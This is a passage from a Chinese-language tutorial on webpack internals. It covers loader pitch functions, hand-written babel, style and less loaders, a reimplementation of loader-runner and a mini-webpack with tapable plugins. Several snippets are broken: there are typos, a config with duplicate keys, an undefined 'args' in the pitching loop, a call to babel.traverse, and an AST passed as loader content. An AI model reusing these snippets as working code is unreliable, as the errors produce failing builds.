实现pitch方法不总是必要的，只有当你需要上述提到的额外控制或优化时，才考虑添加。正确使用pitch方法可以让你的 loader 更加灵活和高效，但也需要谨慎处理，以避免引入不必要的复杂性或潜在的问题。\npitch 与 loader 本身方法的执行顺序图\n1 2 3 4 5 6 7 |- a-loader `pitch` |- b-loader `pitch` |- c-loader `pitch` |- requested module is picked up as a dependency |- c-loader normal execution |- b-loader normal execution |- a-loader normal execution 一旦有某个 loader 有 pitch，并且被执行后返回不为假值，则并不会进行源文件的读取操作。\n在 Webpack 中，Loader 的pitch函数接收四个参数。这些参数分别是：\nremainingRequest：表示当前模块的剩余请求路径。它是一个字符串，包含了当前模块的相对路径，以及在处理当前模块之前还需要加载的其他模块的请求路径。 previousRequest：表示当前模块的前一个请求路径。它是一个字符串，包含了前一个处理该模块的 Loader 的请求路径。 data：一个可选的参数，是一个对象，可以用于在 Loader 之间共享数据。 context：表示 Loader 的上下文对象。它是一个对象，包含了与当前模块相关的一些信息，如当前模块的绝对路径、请求路径等。 这些参数可以帮助 Loader 在处理模块时进行更精细的控制和决策。通过分析和操作这些参数，Loader 可以根据需要修改模块请求的顺序、路径等，以满足特定的需求。\n每个 loader 函数在 webpack 内部被调用的时候，都会为该 loader 函数绑定一个 this，又被称为 loader 上下文：https://www.webpackjs.com/api/loaders/#the-loader-context\n扩展知识\nrunSyncOrAsync 既可以是同步也可以是异步。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 function runSyncOrAsync(fn, callback) { let sync = true; global.async = () =\u0026gt; { sync = false; return callback; }; fn(); if (sync) { callback(); } } // 这个方法是同步还是异步，取决于fn中的代码逻辑 // 同步的使用方式： function normal() { // 函数体中不能有调用global.async的语句 //const callback= global.async(); console.log(\u0026#34;normal\u0026#34;); //setTimeout(callback,3000); } // 异步的使用方式： function normal() { const callback = global.async(); console.log(\u0026#34;normal\u0026#34;); setTimeout(callback, 3000); } function callback() { console.log(\u0026#34;callback\u0026#34;); } runSyncOrAsync(normal, callback); babel-loader 1 npm install @babel/core @babel/preset-env -D webpack.config.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 { test:/\\.js$/, exclude:/node_modules/, resolveLoader:{ alias:{ \u0026#39;bable-loader\u0026#39;:path.resolve(__dirname,\u0026#39;/loaders/babel-loader.js\u0026#39;) // 方式二，起别名的方式 } modules:[path.resolve(__dirname,\u0026#39;loaders\u0026#39;),\u0026#39;node_modules\u0026#39;] // 方式三 }, use:{ loader:path.resolve(__dirname,\u0026#39;/loaders/babel-loader.js\u0026#39;), // 方式一 loader:\u0026#39;babel-loader\u0026#39;, // 方式二和方式三公用，起别名的方式 options:{ presets:[\u0026#39;@babel/preset-env\u0026#39;] } } } babel-loader.js babel-loader @babel/core babel-plugin-transform-react-jsx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 const babel = require(\u0026#34;@babel/core\u0026#34;); const path = require(\u0026#34;path\u0026#34;); function loader(source, inputAst, inputSourceMap) { // 在loader里，this是一个称为loaderContext的对象，上面有很多方法可以使用,其中就包括getOptions // 需要把loader的执行从同步变成异步 const callback = this.async(); let options = this.getOptions(); // 检查是否存在AST，如果存在，则直接使用，否则将source作为转译输入 if (!inputAst) { // 没有提供AST，回退到使用source代码 let babelOptions = { ...options, ast: true, sourceMaps: true, inputSourceMap, }; babel .transformAsync(source, babelOptions) .then(({ code, map, ast }) =\u0026gt; { // 在loader执行完成后才让调用callback表示本loader已经完成了 callback(null, code, map, ast); }) .catch((err) =\u0026gt; callback(err)); } else { // 直接使用提供的AST进行转译 let babelOptions = { ...options, ast: true, sourceMaps: true, inputSourceMap, }; // 使用transformFromAstAsync直接转换AST babel .transformFromAstAsync(inputAst, source, babelOptions) .then(({ code, map, ast }) =\u0026gt; { // 在loader执行完成后才让调用callback表示本loader已经完成了 callback(null, code, map, ast); }) .catch((err) =\u0026gt; callback(err)); } } module.exports = loader; /* 同步转换 function loader(source) { //在loader里this其实是一个称为loaderContext的对象 let options = this.getOptions(); const { code} = babel.transformSync(source,options); // transformSync同步编译 return code; } */ /** * babel-loader只是提供一个转换函数，但是它并不知道要干啥要转啥 * @babel/core 负责把源代码转成AST，然后遍历AST，然后重新生成新的代码 * 但是它并不知道如何转换语换法，它并不认识箭头函数，也不知道如何转换 * @babel/transform-arrow-functions 插件其实是一个访问器，它知道如何转换AST语法树 * 因为要转换的语法太多，插件也太多。所以可一堆插件打包大一起，成为预设preset-env */ 如果在多个 loader 中都使用了@babel/core 来解析源代码，为了性能考虑可以在多个 loader 之间传递第一个 babel/core 解析源码后得到 ast 对象，而不必在每个 loader 中都调用 babel/core 转换一遍源代码。\nloader 函数接收三个参数：source（源代码文本），inputAst（前一个 loader 可能提供的 AST），和inputSourceMap（上一个 loader 提供的 source map）。\n从 webpack 5 开始，this.getOptions 可以获取到 loader 上下文对象。它用来替代来自 loader-utils 中的 getOptions 方法。\n扩展：\n在 Webpack 的 loader 链中，如果多个 loader 都使用了 Babel 进行代码转换，理论上可以通过共享 Babel 生成的 AST（抽象语法树）来提高性能，避免重复的解析步骤。Babel 本身是支持 AST 的输入和输出的，这意味着前一个 loader 可以生成 AST，而后一个 loader 可以直接复用这个 AST，而不必重新解析代码。\n不过，Webpack 本身并不自动处理 AST 的传递，你需要手动实现 AST 在 loader 之间的共享。需要在每个 loader 中显式地处理 AST 的输入和输出。\n如何共享 Babel 的 AST？\n前一个 loader 输出 AST： 使用 Babel 处理时，可以让第一个 loader 输出 AST，而不是最终的代码。\n后一个 loader 复用 AST： 后续的 loader 可以直接接受 AST 作为输入，而不需要再次解析源码。\n实现步骤\n假设有两个使用 Babel 的 loader，并希望它们共享 AST。可以通过在 Webpack 的 loader 中传递 AST 来实现。\n自定义 babel-loader 来输出 AST\n首先，修改一个自定义的 Babel loader，使其输出 AST：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // first-babel-loader.js const babel = require(\u0026#34;@babel/core\u0026#34;); module.exports = function (source) { const options = this.getOptions() || {}; // 转换代码，并输出 AST const result = babel.transformSync(source, { ...options, ast: true, // 生成 AST code: false, // 不生成代码 }); // 通过 this.callback 传递 AST this.callback(null, result.ast, null); }; 后续 loader 接收 AST 作为输入\n然后，实现第二个 loader，它接收并处理 AST，而不是源码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // second-babel-loader.js const babel = require(\u0026#34;@babel/core\u0026#34;); module.exports = function (source) { // 检查是否已经有 AST，如果有，直接使用 AST const options = this.getOptions() || {}; let ast = typeof source === \u0026#34;string\u0026#34; ? null : source; // 判断传入的是否是 AST if (!ast) { // 如果没有 AST，解析源码（这应该不会发生，因为第一个 loader 会传 AST） const result = babel.transformSync(source, { ...options, ast: true }); ast = result.ast; } // 在此基础上对 AST 进行二次处理，生成最终代码 const result = babel.transformFromAstSync(ast, null, { ...options, code: true, // 生成代码 }); // 返回最终的代码 return this.callback(null, result.code, result.map); }; Webpack 配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 const path = require(\u0026#34;path\u0026#34;); module.exports = { module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, use: [ { loader: path.resolve(__dirname, \u0026#34;second-babel-loader.js\u0026#34;), // 第二个 loader 使用 AST options: { presets: [\u0026#34;@babel/preset-env\u0026#34;], }, }, { loader: path.resolve(__dirname, \u0026#34;first-babel-loader.js\u0026#34;), // 第一个 loader 生成 AST options: { presets: [\u0026#34;@babel/preset-env\u0026#34;], }, }, ], }, ], }, }; 关键点：\n第一个 loader (first-babel-loader.js) 负责解析源码并生成 AST，然后将 AST 传递给下一个 loader。 第二个 loader (second-babel-loader.js) 直接接收 AST 并在此基础上进行进一步的转换。 通过这种方式，多个 loader 之间可以共享 AST，避免了每个 loader 重新解析源码的开销。这在需要进行多次转换的场景下，能够显著提升性能。 style-loader 这个函数(pitch)在常规的 loader 转换函数执行之前被调用，提供了一个机会来决定是否跳过后续的 loader 或者在没有处理资源的情况下直接返回结果。\npitch函数接收以下参数：\nremainingRequest：一个包含了所有剩余请求的字符串。这些剩余的请求包括了 loader 链中位于当前 loader 后面的 loader，以及最终的资源路径。这个字符串可以直接被 webpack 使用，以便在某些场景下重新启动 loader 处理流程。 precedingRequest：一个包含了所有前置请求的字符串。这些前置请求包括了 loader 链中位于当前 loader 前面的所有 loader。这个信息可以用来了解资源在到达当前 loader 之前已经经过了哪些处理。 data：一个可以在 pitch 和普通 loader 转换函数之间共享数据的对象。这个对象是空的，可以被当前 loader 的pitch函数和主体（normal）函数使用，以在两者之间共享信息。 函数的返回值有特别的含义：\n如果pitch函数返回一个值（不是undefined），这个返回的结果会被用来跳过剩余的 loader 并直接处理这个结果，就像是这个结果已经通过了所有剩余的 loader 一样。 如果没有返回值（或者返回undefined），webpack 就会继续执行剩余的 loader 链，最后处理资源。 pitch函数的使用场景包括但不限于：\n根据特定条件提前结束 loader 处理。 在资源被实际处理之前，修改或添加必要的预处理步骤。 在不同 loader 之间共享数据。 通过使用pitch函数，可以在资源加载和转换过程中添加更多的控制逻辑，使得资源的处理更加灵活和高效。\npreviousRequest 前面的 loader currentRequest 自己和后面的 loader+资源路径 remainingRequest 后面的 loader+资源路径 data: 和普通的 loader 函数的第三个参数一样,而且 loader 执行的全程用的是同一个对象 注意sourceMaps最后有个s 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 //css文本代码 export default const path = require(\u0026#34;path\u0026#34;); function normalize(path) { return path.replace(/\\\\/g, \u0026#34;/\u0026#34;); } function loader(source) {} // pitch是loader的一个方法 loader.pitch = function (remainingRequest) { console.log(\u0026#34;remainingRequest\u0026#34;, remainingRequest); console.log(\u0026#34;context\u0026#34;, this.context); //index.less模块所在的目录 可以用作解析其他模块成员的上下文 //1.获取剩下的请求 //2.用!分割得到各个部分的绝对路径，前面是loader路径，后面是文件路径 //3.把路径从绝对路径变成相对于根目录的相对路径 //路径的前面要加上!!,只使用行内loader,不使用rule里面配置的loader,不然就会死循环了 /* const request = \u0026#34;!!\u0026#34;+(remainingRequest.split(\u0026#39;!\u0026#39;).map( //这个路径其实就是模块的ID requestAbsPath =\u0026gt; (\u0026#34;./\u0026#34; + path.posix.relative(normalize(this.context), normalize(requestAbsPath)))).join(\u0026#39;!\u0026#39;)); console.log(\u0026#39;request\u0026#39;, request); */ const request = \u0026#34;!!\u0026#34; + remainingRequest .split(\u0026#34;!\u0026#34;) .map((request) =\u0026gt; this.utils.contextify(this.context, request)) .join(\u0026#34;!\u0026#34;); console.log(\u0026#34;request\u0026#34;, request); let script = ` let styleCSS = require(${JSON.stringify(request)}); let style = document.createElement(\u0026#39;style\u0026#39;); style.innerHTML =styleCSS; document.head.appendChild(style); `; return script; }; module.exports = loader; //require(\u0026#34;!!../loaders/less-loader.js!./index.less\u0026#34;); /** [ C:\\aproject\\webpack202208\\5.loader\\loaders\\less-loader.js, C:\\aproject\\webpack202208\\5.loader\\src\\index.less ] request=[ ./loaders\\less-loader.js, .\\src\\index.less ] * */ less-loader less-loader 返回的是 css 代码，但是如果返回的不是一段 css 代码而是 js 代码的话，就需要后续的 loader 对返回的是 js 代码也要提供支持。\n1 2 3 4 5 6 7 8 9 10 const less = require(\u0026#34;less\u0026#34;); function loader(source) { // 该loader函数中的this就是由loader-runner库绑定的，里面有一些方法和属性 let callback = this.async(); less.render(source, { filename: this.resource }, (err, output) =\u0026gt; { // callback(err,output.css) // 直接返回css代码 callback(err, `module.exports = ${JSON.stringify(output.css)}`); // 返回js代码 }); } module.exports = loader; loader-runner 实现 loader-runner 的使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 const { runLoaders } = require(\u0026#34;./loader-runner\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const entryFile = path.resolve(__dirname, \u0026#34;src/index.js\u0026#34;); let request = `inline-loader1!inline-loader2!${entryFile}`; const rules = [ { test: /\\.js$/, use: [\u0026#34;normal-loader1\u0026#34;, \u0026#34;normal-loader2\u0026#34;], }, { test: /\\.js$/, enforce: \u0026#34;pre\u0026#34;, use: [\u0026#34;pre-loader1\u0026#34;, \u0026#34;pre-loader2\u0026#34;], }, { test: /\\.js$/, enforce: \u0026#34;post\u0026#34;, use: [\u0026#34;post-loader1\u0026#34;, \u0026#34;post-loader2\u0026#34;], }, ]; const parts = request.replace(/^-?!+/, \u0026#34;\u0026#34;).split(\u0026#34;!\u0026#34;); let resource = parts.pop(); let inlineLoaders = parts; let preLoaders = [], postLoaders = [], normalLoaders = []; for (let i = 0; i \u0026lt; rules.length; i++) { let rule = rules[i]; if (resource.match(rule.test)) { if (rule.enforce == \u0026#34;pre\u0026#34;) { preLoaders.push(...rule.use); } else if (rule.enforce == \u0026#34;post\u0026#34;) { postLoaders.push(...rule.use); } else { normalLoaders.push(...rule.use); } } } let loaders = []; if (request.startsWith(\u0026#34;!!\u0026#34;)) { loaders = inlineLoaders; } else if (request.startsWith(\u0026#34;-!\u0026#34;)) { loaders = [...postLoaders, ...inlineLoaders]; } else if (request.startsWith(\u0026#34;!\u0026#34;)) { loaders = [...postLoaders, ...inlineLoaders, ...preLoaders]; } else { loaders = [...postLoaders, ...inlineLoaders, ...normalLoaders, ...preLoaders]; } //把loader从一个名称变成一个绝对路径 loaders = loaders.map((loader) =\u0026gt; path.resolve(__dirname, \u0026#34;loader-chain\u0026#34;, loader) ); debugger; runLoaders( { resource, //要处理的资源文件 loaders, //资源文件需要经过发些loader的处理 context: { age: 18, author: \u0026#34;zhufeng\u0026#34; }, readResource: fs.readFile, //读文件用哪个方法 }, (err, result) =\u0026gt; { //finalCallback console.log(err); console.log(result.result[0].toString()); //转换后的结果 //转换前源文件的内容 console.log(result.resourceBuffer); console.log( result.resourceBuffer ? result.resourceBuffer.toString() : null ); } ); loader 的运行流程\n实现\nLoaderRunner.js NormalModuleFactory.js NormalModule.js 每个 loader 导出的函数中的 this 都是由 loader-runner 这个库绑定的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 /** * 根据loader的绝对路径创建loader对象 * @param {*} loaderAbsPath */ function createLoaderObject(loaderAbsPath) { const normal = require(loaderAbsPath); const pitch = normal.pitch; //如果设置normal.raw属性为true的话，那么loader的normal函数参数就是一个Buffer,否则就是一个字符串 const raw = normal.raw; return { path: loaderAbsPath, normal, pitch, raw, data: {}, //每个loader都有一个自已的自定对象，可以有用来保存和传递数据 pitchExecuted: false, //表示此loader的pitch已经执行过了 normalExecuted: false, //表示此loader的normal函数已经执行过了 }; } /** * 转换loader的参数 * @param {*} args 参数 * @param {*} raw 布尔值，表示loader想要字符串还是想要Buffer */ function convertArgs(args, raw) { if (raw \u0026amp;\u0026amp; !Buffer.isBuffer(args[0])) { args[0] = Buffer.from(args[0]); } else if (!raw \u0026amp;\u0026amp; Buffer.isBuffer(args[0])) { args[0] = args[0].toString(); } } function iterateNormalLoaders( processOptions, loaderContext, args, pitchingCallback ) { if (loaderContext.loaderIndex \u0026lt; 0) { return pitchingCallback(null, args); } let currentLoader = loaderContext.loaders[loaderContext.loaderIndex]; if (currentLoader.normalExecuted) { loaderContext.loaderIndex--; return iterateNormalLoaders( processOptions, loaderContext, args, pitchingCallback ); } let fn = currentLoader.normal; //就是loader里的normal函数 currentLoader.normalExecuted = true; convertArgs(args, currentLoader.raw); //要以同步或者异步的方式执行fn runSyncOrAsync(fn, loaderContext, args, (err, ...returnArgs) =\u0026gt; { if (err) pitchingCallback(err); return iterateNormalLoaders( processOptions, loaderContext, returnArgs, pitchingCallback ); }); } function runSyncOrAsync(fn, loaderContext, args, runCallback) { let isSync = true; //默认fn的的执行是同步 let isDone = false; //表示当前的函数是否已经完成了 loaderContext.callback = (err, ...args) =\u0026gt; { if (isDone) { throw new Error(\u0026#34;callback(): The callback was already called.\u0026#34;); } isDone = true; //callback 是不是要判断下isSync的值啊 runCallback(err, ...args); }; loaderContext.async = () =\u0026gt; { isSync = false; return loaderContext.callback; }; let result = fn.apply(loaderContext, args); //如果当前的执行是同步的话 if (isSync) { isDone = true; runCallback(null, result); } //如果是异步，不会立刻调用runCallback,需要你在loader的内部手工触发callback,然后执行runCallback } function processResource(processOptions, loaderContext, pitchingCallback) { processOptions.readResource(loaderContext.resource, (err, resourceBuffer) =\u0026gt; { processOptions.resourceBuffer = resourceBuffer; //要加载的资源的二进制数组 Buffer loaderContext.loaderIndex--; iterateNormalLoaders( processOptions, loaderContext, [resourceBuffer], pitchingCallback ); }); } function iteratePitchingLoaders( processOptions, loaderContext, pitchingCallback ) { if (loaderContext.loaderIndex \u0026gt;= loaderContext.loaders.length) { return processResource(processOptions, loaderContext, pitchingCallback); } //获取当前索引对应的loader对象 let currentLoader = loaderContext.loaders[loaderContext.loaderIndex]; if (currentLoader.pitchExecuted) { loaderContext.loaderIndex++; return iteratePitchingLoaders( processOptions, loaderContext, pitchingCallback ); } //因为我们要保证一个loader pitch或者说normal只走一次 //获取当前loader对应的pitch函数 let fn = currentLoader.pitch; currentLoader.pitchExecuted = true; if (!fn) { return iteratePitchingLoaders( processOptions, loaderContext, pitchingCallback ); } runSyncOrAsync( fn, loaderContext, [ loaderContext.remainingRequest, loaderContext.previousRequest, loaderContext.data, ], (err, ...returnArgs) =\u0026gt; { //判断pitch方法的返回值有没有，如果有则跳过后面的loader,返回头执行前一个loader if (returnArgs.length \u0026gt; 0 \u0026amp;\u0026amp; returnArgs.some((item) =\u0026gt; item)) { loaderContext.loaderIndex--; iterateNormalLoaders( processOptions, loaderContext, args, pitchingCallback ); } else { return iteratePitchingLoaders( processOptions, loaderContext, pitchingCallback ); } } ); } function runLoaders(options, finalCallback) { //resource要处理的资源，或者说要编译的模块路径 //loaders处理此路径的loaders //context指的是loader函数在执行的时候this指针 //readResource读取文件的方法fs.readFile const { resource, loaders = [], context = {}, readResource } = options; //loaders现在是一个loader模块的绝对路径，转成一个对象 const loaderObjects = loaders.map(createLoaderObject); const loaderContext = context; //这个对象就是loader执行的时候的this指针 loaderContext.resource = resource; //加载的模块 loaderContext.readResource = readResource; //读取文件的方法 loaderContext.loaders = loaderObjects; //存放loaders对象数组 loaderContext.loaderIndex = 0; //当前正在处理的loader的索引 loaderContext.callback = null; //可以手工调用此方法向后执行下一个loader loaderContext.async = null; //可以把loader运行从同步变为异步,并返回this.callback //代表整个请求 Object.defineProperty(loaderContext, \u0026#34;request\u0026#34;, { get() { //把loader的绝对路径和要加载的资源的绝对路径用!拼在一起 return loaderContext.loaders .map((loader) =\u0026gt; loader.path) .concat(loaderContext.resource) .join(\u0026#34;!\u0026#34;); }, }); Object.defineProperty(loaderContext, \u0026#34;remainingRequest\u0026#34;, { get() { return loaderContext.loaders .slice(loaderContext.loaderIndex + 1) .map((loader) =\u0026gt; loader.path) .concat(loaderContext.resource) .join(\u0026#34;!\u0026#34;); }, }); Object.defineProperty(loaderContext, \u0026#34;currentRequest\u0026#34;, { get() { return loaderContext.loaders .slice(loaderContext.loaderIndex) .map((loader) =\u0026gt; loader.path) .concat(loaderContext.resource) .join(\u0026#34;!\u0026#34;); }, }); Object.defineProperty(loaderContext, \u0026#34;previousRequest\u0026#34;, { get() { return loaderContext.loaders .slice(0, loaderContext.loaderIndex) .map((loader) =\u0026gt; loader.path) .join(\u0026#34;!\u0026#34;); }, }); Object.defineProperty(loaderContext, \u0026#34;data\u0026#34;, { get() { return loaderContext.loaders[loaderContext.loaderIndex].data; }, }); const processOptions = { readResource, //fs.readFile resourceBuffer: null, //要读取的资源的源代码，它是一个Buffer,就二进制字节数组 }; iteratePitchingLoaders(processOptions, loaderContext, (err, result) =\u0026gt; { //pitchingCallback finalCallback(err, { result, //是最终处理的结果 ,其实就是最左则的loader的normal 返回值 resourceBuffer: processOptions.resourceBuffer, }); }); } exports.runLoaders = runLoaders; 一个面试题，有两个函数 A 和 B，其中 B 函数，有时候希望它是在 A 执行后同步执行的，有时候希望它是在 A 执行后异步执行的，如何实现这个工具函数，它接受 A，B 作为实参？\n如果该函数是同步的，那么这两个函数会依次执行，如果这个函数是异步的，那么希望后面那个函数在该异步函数执行完后再执行，现在需要实现一个工具函数来达到这个目的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function runSyncOrAsync(fn,loaderContent,args,runCallback){ let isSync = true;// 默认同步 let isDone = false loaderContext.callback = (err,...args)=\u0026gt;{ if(isDone){ thorow new Error(\u0026#39;已经执行过callback函数，无法再次执行\u0026#39;) } isDone = true return runCallback(err,...args) } loaderContext.async = ()=\u0026gt;{ isSync = false; return loaderContext.callback } let result = fn.apply(loaderContext,args); if(isSync){ isDone = true runCallback(null,result) } } 模拟同步：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function normal() { console.log(\u0026#34;normal\u0026#34;); return \u0026#34;normal\u0026#34;; } function callback(value) { cons.log(\u0026#34;callback\u0026#34; + value); } function runSyncOrAsync(fn, callback) { const result = fn(); callback(result); } runSyncOrAsync(normal, callback); 模拟异步：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function normal() { console.log(\u0026#34;normal\u0026#34;); const callback = this.async(); setTimeout(() =\u0026gt; { callback(\u0026#34;normal\u0026#34;); }); } function callback(value) { console.log(\u0026#34;callback\u0026#34; + value); } function runSyncOrAsync(fn, callback) { const contextFn = { sync: true, }; contextFn.async = function () { contextFn.sync = false; return callback; }; const result = fn.call(contextFn); if (contextFn.sync) { callback(result); } } runSyncOrAsync(normal, callback); 模拟实现微型的 webpack 模拟一个核心功能俱全的微型 Webpack 需要包含以下几个关键部分：\n入口文件的解析：通过递归分析依赖关系，构建模块依赖图。 打包：将所有的模块合并成一个或多个文件。 Loader 机制：支持对不同类型的文件进行转换，如将 ES6 转换为 ES5。 插件机制：通过生命周期钩子扩展 Webpack 功能。 我们会使用 Node.js 实现一个微型的 Webpack，虽然简化了很多功能，但它能帮助理解 Webpack 的核心设计。\n模块依赖解析 首先，需要递归解析入口文件及其依赖模块。这里可以用 Node.js 的 fs 模块来读取文件，并通过 babel 来解析并转换模块。\n模拟 Loader 机制 为了模拟 Loader，会允许配置一个简单的函数链，处理每个模块的内容。\n模拟插件系统 插件系统基于 Webpack 的生命周期钩子机制，用事件驱动模型来实现插件功能。\n代码实现\n下面是一个简单的微型 Webpack 的实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 // 微型Webpack的实现 const fs = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const babel = require(\u0026#34;@babel/core\u0026#34;); const { SyncHook } = require(\u0026#34;tapable\u0026#34;); // 使用Tapable来模拟事件机制 class MiniWebpack { constructor(options) { this.entry = options.entry; // 入口文件 this.output = options.output; // 输出配置 this.modules = []; // 模块依赖数组 this.loaders = options.loaders || []; // 模拟Loader数组 this.plugins = options.plugins || []; // 插件 this.hooks = { beforeRun: new SyncHook([\u0026#34;compiler\u0026#34;]), // 注册钩子 afterCompile: new SyncHook([\u0026#34;compiler\u0026#34;]), emit: new SyncHook([\u0026#34;compiler\u0026#34;]), done: new SyncHook([\u0026#34;stats\u0026#34;]), }; // 应用插件 this.plugins.forEach((plugin) =\u0026gt; plugin.apply(this)); } // 读取文件内容并解析 parseModule(filename) { let content = fs.readFileSync(filename, \u0026#34;utf-8\u0026#34;); // 处理 Loader this.loaders.forEach((loader) =\u0026gt; { if (loader.test.test(filename)) { content = loader.use(content); } }); // 使用 Babel 将 ES6 转换为 ES5 const { ast, code } = babel.transformSync(content, { ast: true, presets: [\u0026#34;@babel/preset-env\u0026#34;], }); // 提取依赖模块 const dependencies = []; babel.traverse(ast, { ImportDeclaration({ node }) { dependencies.push(node.source.value); }, }); return { filename, code, dependencies }; } // 构建模块依赖图 buildDependencyGraph(entry) { const entryModule = this.parseModule(entry); const graph = [entryModule]; // 递归解析模块依赖的其他模块 for (const mod of graph) { mod.dependencies.forEach((dep) =\u0026gt; { const depPath = path.resolve(path.dirname(mod.filename), dep); const depModule = this.parseModule(depPath); graph.push(depModule); }); } return graph; } // 生成打包后的代码 generateCode(graph) { const modules = graph .map((mod) =\u0026gt; { return `\u0026#34;${mod.filename}\u0026#34;: function(require, module, exports) { ${mod.code} }`; }) .join(\u0026#34;,\u0026#34;); return ` (function(modules) { function require(filename) { const fn = modules[filename]; const module = { exports: {} }; fn(require, module, module.exports); return module.exports; } require(\u0026#34;${this.entry}\u0026#34;); })({${modules}}); `; } // 执行打包 run() { this.hooks.beforeRun.call(this); // 构建依赖图 const graph = this.buildDependencyGraph(this.entry); this.hooks.afterCompile.call(this); // 生成代码并写入文件 const output = this.generateCode(graph); this.hooks.emit.call(this); fs.writeFileSync(this.output.path, output, \u0026#34;utf-8\u0026#34;); this.hooks.done.call({ output }); } } module.exports = MiniWebpack; 使用方式 1. 定义 Loader 在这个微型 Webpack 中，Loader 只是简单的函数转换。我们可以传入一个匹配文件类型的正则表达式和处理函数。\n1 2 3 4 5 6 7 8 js复制代码// loader例子 module.exports = { test: /\\.js$/, use(content) { // 简单的转换 return content.replace(/console\\.log/g, \u0026#39;alert\u0026#39;); } }; 2. 定义插件 我们可以通过插件来扩展 Webpack 的功能，例如在打包的不同阶段执行自定义逻辑。插件通过 apply 方法注册到 Webpack 中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 js复制代码// plugin例子 class HelloWorldPlugin { apply(compiler) { compiler.hooks.beforeRun.tap(\u0026#39;HelloWorldPlugin\u0026#39;, () =\u0026gt; { console.log(\u0026#39;Webpack 构建开始！\u0026#39;); }); compiler.hooks.done.tap(\u0026#39;HelloWorldPlugin\u0026#39;, stats =\u0026gt; { console.log(\u0026#39;Webpack 构建完成！\u0026#39;); }); } } module.exports = HelloWorldPlugin; 3. Webpack 配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 js复制代码const MiniWebpack = require(\u0026#39;./mini-webpack\u0026#39;); const HelloWorldPlugin = require(\u0026#39;./hello-world-plugin\u0026#39;); const babelLoader = require(\u0026#39;./babel-loader\u0026#39;); const config = { entry: \u0026#39;./src/index.js\u0026#39;, output: { path: \u0026#39;./dist/bundle.js\u0026#39;, }, loaders: [babelLoader], plugins: [new HelloWorldPlugin()], }; const compiler = new MiniWebpack(config); compiler.run(); 运行打包流程 假设我们有以下项目结构：\n1 2 3 4 5 6 bash复制代码/src index.js other.js mini-webpack.js babel-loader.js hello-world-plugin.js index.js 通过 import 依赖了 other.js。当我们运行 node build.js，Webpack 就会按照如下流程执行：\n解析入口文件：从 entry 开始，解析代码，提取依赖关系，并通过 Loader 处理文件。 构建依赖图：递归解析所有的依赖文件，构建完整的模块依赖图。 生成代码：根据依赖图，将所有模块打包成一个文件，使用自定义的 require 函数来加载模块。 触发插件：插件会在构建的不同阶段通过钩子系统执行自定义逻辑。 插件 前置知识 面试的时候手写并发控制，异步机制代码，都可以参考 tapable 库的这些方法。tapable 可以独立使用。\n异步任务的并发数控制函数。\n例题：\n请实现如下的函数，可以批量请求数据，所有的 URL 地址在 urls 参数中，同时可以通过 max 参数控制请求的并发度，当所有请求结束之后，需要执行 callback 回调函数，发请求的函数可以直接使用 fetch 即可。\nfunction sendRequest(urls:string[],max:number,callback:()=\u0026gt;void){ }\n在 webpack 中，Compiler和Compilation实例上的 hooks 使用了多种类型，以提供不同的插件机制，从而允许插件开发者在 webpack 的编译过程中的不同阶段以不同的方式参与进来。每种类型的 hook 都有其特定的行为和用途，这使得 webpack 的插件系统非常灵活和强大。\nWebpack 本质上是一种事件流机制，它的核心架构设计就是围绕着 事件驱动 和 插件系统 来构建的。这种设计让 Webpack 本身非常灵活，能够通过插件系统扩展其功能，开发者可以使用插件深入控制 Webpack 的打包过程。\nWebpack 